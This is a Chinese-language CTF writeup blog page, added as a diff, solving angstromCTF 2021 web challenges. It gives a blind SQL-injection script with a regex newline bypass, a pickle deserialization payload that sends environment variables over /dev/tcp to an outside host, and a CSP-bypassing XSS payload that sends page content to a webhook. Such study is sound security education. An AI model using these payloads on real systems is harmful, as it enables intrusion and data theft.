@@ -1,0 +1,1665 @@
+<!DOCTYPE html>
+<html lang="">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>angstromCTF 2021 - byc_404&#39;s blog</title>
+  
+    <meta name="keywords" content="CTF,WEB">
+  
+
+  
+    <meta name="description" content="  放假时做了下 angstromCTF的题目, 质量都挺不错的。这里记录下自己做出来的题目以及复现的。">
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a href="https://www.baidu.com/s?wd=启用JavaScript" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="搜索" />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="half" class='cover-wrapper post dock' style="display: ;">
+          
+            <div id='cover-backstretch'></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">byc_404's blog</p>
+    
+    
+      <p class="subtitle">Do not go gentle into that good night</p>
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+          
+            <a href="/"
+              
+              
+              id="home">
+              <i class='fas fa-rss fa-fw'></i><p>博客</p>
+            </a>
+          
+            <a href="/tags/"
+              
+              
+              id="tags">
+              <i class='fas fa-tags fa-fw'></i><p>标签</p>
+            </a>
+          
+            <a href="/archives/"
+              
+              
+              id="archives">
+              <i class='fas fa-archive fa-fw'></i><p>归档</p>
+            </a>
+          
+            <a href="/friends/"
+              
+              
+              id="friends">
+              <i class='fas fa-link fa-fw'></i><p>友链</p>
+            </a>
+          
+            <a href="/about/"
+              
+              
+              id="about">
+              <i class='fas fa-info-circle fa-fw'></i><p>关于</p>
+            </a>
+          
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        angstromCTF 2021
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="https://www.bycsec.top" rel="nofollow">
+    <img no-lazy src="/assests/favicon.ico">
+    <p>byc_404</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Apr 4, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="angstromCTF 2021" data-path="/2021/04/04/angstromCTF-2021/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <p>  放假时做了下 angstromCTF的题目, 质量都挺不错的。这里记录下自己做出来的题目以及复现的。</p>
+<a id="more"></a>
+
+<p>  (反观某国内比赛智障脑洞题, 真的无语</p>
+<h2 id="Sea-of-Quills"><a href="#Sea-of-Quills" class="headerlink" title="Sea of Quills"></a>Sea of Quills</h2><p>  题目给了ruby 源码。 有很明显的注入。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">"-"</span>, <span class="string">"/"</span>, <span class="string">";"</span>, <span class="string">"'"</span>, <span class="string">"\""</span>]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; <span class="params">|word|</span></span><br><span class="line">    <span class="keyword">if</span> cols.<span class="keyword">include</span>? word</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br></pre></td></tr></table></figure>
+
+<p>基本没waf. 直接子查询查表名,再从flagtable查flag即可<br><code>col=(select flag from flagtable)</code></p>
+<h2 id="Sea-of-Quills2"><a href="#Sea-of-Quills2" class="headerlink" title="Sea of Quills2"></a>Sea of Quills2</h2><p>第二版就很有意思了。加上了看似非常严格的waf. col长度不能超过24.limit 与offset需要为数字。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">"-"</span>, <span class="string">"/"</span>, <span class="string">";"</span>, <span class="string">"'"</span>, <span class="string">"\""</span>, <span class="string">"flag"</span>]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; <span class="params">|word|</span></span><br><span class="line">    <span class="keyword">if</span> cols.<span class="keyword">include</span>? word</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cols.length &gt; <span class="number">24</span> <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) <span class="params">||</span> !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br></pre></td></tr></table></figure>
+<p>要知道<code>select*fromsqlite_master</code>才24字母。就是说子查询肯定不可行。那么要如何注入呢?</p>
+<p>这时我想起去年做过的zer0pts2020 里的urlapp, 一道利用url打redis 改键名读键名的题目。那道题的有趣之处在于使用<code>BITOP</code>进行按位改, 然而漏洞根源却是，ruby正则的脆弱性导致了可以传入<code>\n</code>bypass 正则, 从而SSRF 打 redis.</p>
+<p>所以此处唯一可能绕过的地方自然是limit 与offset. 当我fuzz limit 传入<code>\n</code>时,发现正则确实被绕过了。而且除此之外，还能在<code>\n</code>后传入任意字符而不被waf匹配到。<br>(之后了解到ruby正则只匹配单行)</p>
+<p>所以就是盲注的事了。我用比较偏爱的报错区分状态码来注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://seaofquills-two.2021.chall.actf.co/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    print(j)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</span><br><span class="line">        r = requests.post(url + <span class="string">'quills'</span>, data=&#123;</span><br><span class="line">            <span class="string">'cols'</span>: <span class="string">"(select 1)"</span>,</span><br><span class="line">            <span class="string">'limit'</span>: <span class="string">"2\n or abs(case when(substr((select flag from flagtable limit 1),"</span>+ str(j) +<span class="string">",1)='"</span> + i + <span class="string">"') then -9223372036854775808 else 0 end);"</span>,</span><br><span class="line">            <span class="string">"offset"</span>: <span class="string">"3"</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</span><br><span class="line">            res += i</span><br><span class="line">            print(res)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>后来想起来直接union select就行了 .. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cols: &quot;* FROM(select name,desc&quot;</span><br><span class="line">limit: &quot;1&quot;</span><br><span class="line">offset: &quot;1\n) UNION SELECT flag, 1 FROM flagtable&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(所以这题zer0pts 拿一血很合理 2333</p>
+<h2 id="Jar"><a href="#Jar" class="headerlink" title="Jar"></a>Jar</h2><p>pickle 反序列化。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">            cmd = [<span class="string">'bash'</span>, <span class="string">'-c'</span>, <span class="string">'echo $(env) &gt; /dev/tcp/xxx/9001 '</span>]</span><br><span class="line">            <span class="keyword">return</span> __import__(<span class="string">'subprocess'</span>).check_output, (cmd,)</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line">payload = b64(s).decode()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://jar.2021.chall.actf.co/add'</span></span><br><span class="line">r = requests.post(url, cookies=&#123;<span class="string">'contents'</span>: payload&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="nomnomnom"><a href="#nomnomnom" class="headerlink" title="nomnomnom"></a>nomnomnom</h2><p>题目给了源码(不过，貌似不给源码也能做)。可以锁定关键代码发现这是一道xss题目</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/shares/:shareName'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> better page maybe...? would attract those sweet sweet vcbucks</span></span><br><span class="line">	<span class="keyword">if</span> (!(req.params.shareName <span class="keyword">in</span> shares)) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">'hey that share doesn\'t exist... are you a time traveller :O'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> share = shares[req.params.shareName];</span><br><span class="line">	<span class="keyword">const</span> score = share.score;</span><br><span class="line">	<span class="keyword">const</span> name = share.name;</span><br><span class="line">	<span class="keyword">const</span> nonce = crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">	<span class="keyword">let</span> extra = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (req.cookies.no_this_is_not_the_challenge_go_away === nothisisntthechallenge) &#123;</span><br><span class="line">		extra = <span class="string">`deletion token: &lt;code&gt;<span class="subst">$&#123;process.env.FLAG&#125;</span>&lt;/code&gt;`</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res.send(<span class="string">`</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">	&lt;head&gt;</span></span><br><span class="line"><span class="string">		&lt;meta http-equiv='Content-Security-Policy' content="script-src 'nonce-<span class="subst">$&#123;nonce&#125;</span>'"&gt;</span></span><br><span class="line"><span class="string">		&lt;title&gt;snek nomnomnom&lt;/title&gt;</span></span><br><span class="line"><span class="string">	&lt;/head&gt;</span></span><br><span class="line"><span class="string">	&lt;body&gt;</span></span><br><span class="line"><span class="string">		<span class="subst">$&#123;extra&#125;</span><span class="subst">$&#123;extra ? <span class="string">'&lt;br /&gt;&lt;br /&gt;'</span> : <span class="string">''</span>&#125;</span></span></span><br><span class="line"><span class="string">		&lt;h2&gt;snek goes &lt;em&gt;nomnomnom&lt;/em&gt;&lt;/h2&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">		Check out this score of <span class="subst">$&#123;score&#125;</span>! &lt;br /&gt;</span></span><br><span class="line"><span class="string">		&lt;a href='/'&gt;Play!&lt;/a&gt; &lt;button id='reporter'&gt;Report.&lt;/button&gt; &lt;br /&gt;</span></span><br><span class="line"><span class="string">		&lt;br /&gt;</span></span><br><span class="line"><span class="string">		This score was set by <span class="subst">$&#123;name&#125;</span></span></span><br><span class="line"><span class="string">		&lt;script nonce='<span class="subst">$&#123;nonce&#125;</span>'&gt;</span></span><br><span class="line"><span class="string">function report() &#123;</span></span><br><span class="line"><span class="string">	fetch('/report/<span class="subst">$&#123;req.params.shareName&#125;</span>', &#123;</span></span><br><span class="line"><span class="string">		method: 'POST'</span></span><br><span class="line"><span class="string">	&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">document.getElementById('reporter').onclick = () =&gt; &#123; report() &#125;;</span></span><br><span class="line"><span class="string">		&lt;/script&gt; </span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">	&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/report/:shareName'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!(req.params.shareName <span class="keyword">in</span> shares)) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">'hey that share doesn\'t exist... are you a time traveller :O'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">await</span> visiter.visit(</span><br><span class="line">		nothisisntthechallenge,</span><br><span class="line">		<span class="string">`http://localhost:9999/shares/<span class="subst">$&#123;req.params.shareName&#125;</span>`</span></span><br><span class="line">	);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>同时注意到bot  用到的是firefox 的 puppeteer</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">visit</span>(<span class="params">secret, url</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; <span class="attr">args</span>: [<span class="string">'--no-sandbox'</span>], <span class="attr">product</span>: <span class="string">'firefox'</span> &#125;)</span><br><span class="line">	<span class="keyword">var</span> page = <span class="keyword">await</span> browser.newPage()</span><br><span class="line">	<span class="keyword">await</span> page.setCookie(&#123;</span><br><span class="line">		name: <span class="string">'no_this_is_not_the_challenge_go_away'</span>,</span><br><span class="line">		value: secret,</span><br><span class="line">		domain: <span class="string">'localhost'</span>,</span><br><span class="line">		samesite: <span class="string">'strict'</span></span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">await</span> page.goto(url)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// idk, race conditions!!! :D</span></span><br><span class="line">	<span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> setTimeout(resolve, <span class="number">500</span>));</span><br><span class="line">	<span class="keyword">await</span> page.close()</span><br><span class="line">	<span class="keyword">await</span> browser.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简而言之。我们现在可控<code>shares</code>页面下直接拼接的score与name.但是页面存在CSP 的nonce 且nonce为动态刷新. 我们可控点在含nounce的script 正上方。</p>
+<p>首先对于这个CSP, 其实是非常奇怪的。一般来说设置script-nonce 可能会先加上<code>script-src: &#39;self&#39;</code> <code>default-src: &#39;self&#39;</code> <code>base-uri: none</code> 之类的。其中一种绕过方法是在没有<code>base-uri</code>的情况下先插入base标签再插入scipt(带nonce),达成xss; 但是这些要求nonce可控，此处自然是不行的。</p>
+<p>但是,注意到我们可控的name就在<code>script</code>标签正上方，一个朴素的想法自然是，想办法让我们的标签把下面的吞掉，并且nonce 正好带进去就行了。<br><code>&lt;script  src=&#39;data:text/plain,alert(1)&#39; a=</code>当然能吞进去，此时在firefox下就已经能xss了.但是chrome下可以么？为了避免<code>&lt;</code>字符的影响,这里我尝试了下设置同名属性，因为浏览器会忽略第二个同名属性。结果发现chrome下确实触发不了,尽管已经解析成正确的代码了</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_72be679263b1b5f2017fa0b2cf482064.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_72be679263b1b5f2017fa0b2cf482064.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>基于题目是firefox,直接xss传html代码就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xss</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url + <span class="string">'record'</span>, json=&#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">"""&lt;script src="data:text/plain,location.href='https://webhook.site/48cbda29-080e-442f-8040-7a52a9093234/?s'+btoa(document.body.innerHTML)" a=123 a="""</span>,</span><br><span class="line">        <span class="string">"score"</span>: <span class="number">44</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url + <span class="string">'report/376d2d58a518de7b'</span>)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Reaction-py"><a href="#Reaction-py" class="headerlink" title="Reaction . py"></a>Reaction . py</h2><p>这题吃了个没域名的亏。 不然很快就能出。。。😦</p>
+<p>本题同样是xss.关键代码在于</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_component</span><span class="params">(name, cfg, bucket)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> name <span class="keyword">or</span> <span class="keyword">not</span> cfg:</span><br><span class="line">        <span class="keyword">return</span> (ERR, <span class="string">"Missing parameters"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(bucket) &gt;= <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (ERR, <span class="string">"Bucket too large (our servers aren't very good :((((()"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(cfg) &gt; <span class="number">250</span>:</span><br><span class="line">        <span class="keyword">return</span> (ERR, <span class="string">"Config too large (our servers aren't very good :((((()"</span>)</span><br><span class="line">    <span class="keyword">if</span> name == <span 